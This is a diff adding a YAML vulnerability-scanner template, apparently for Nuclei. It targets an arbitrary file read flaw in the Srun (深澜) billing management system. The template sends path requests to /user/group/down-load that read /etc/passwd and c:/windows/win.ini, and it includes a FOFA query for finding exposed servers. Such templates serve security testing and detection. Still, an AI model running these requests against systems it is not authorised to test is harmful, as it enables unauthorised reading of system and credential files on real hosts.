@@ -1,0 +1,33 @@
+id: srun-down-load-fileread
+info:
+  name: 深澜计费管理系统down-load存在任意文件读取漏洞
+  author: leadlife
+  severity: high
+  description: 杭州瀚洋科技有限公司（深澜软件）是全球领先且企业高端用户最多的认证计费技术厂商之一，总部位于中国的杭州。目前全球超过2500家企业选择深澜软件作为其用户认证管理及计费方案；其中在中国Top100高校中有60%使用我们的产品。 作为全球认证计费解决方案的领导品牌
+  reference: 
+    - https://github.com/eeeeeeeeee-code/POC/blob/bef1259d4babbff23c207ae283004ec96ddb1fdb/wpoc/%E6%B7%B1%E6%BE%9C%E8%AE%A1%E8%B4%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/%E6%B7%B1%E6%BE%9C%E8%AE%A1%E8%B4%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9Fdown-load%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: body="/js/lib/slimscroll.js"
+    tips:
+    repair:
+    version:
+  tags: srun,fileread
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/user/group/down-load?file=/etc/passwd"
+      - "{{BaseURL}}/user/group/down-load?file=c:/windows/win.ini"
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
+          - "\\[(font|extension|file)s\\]"
+        condition: or
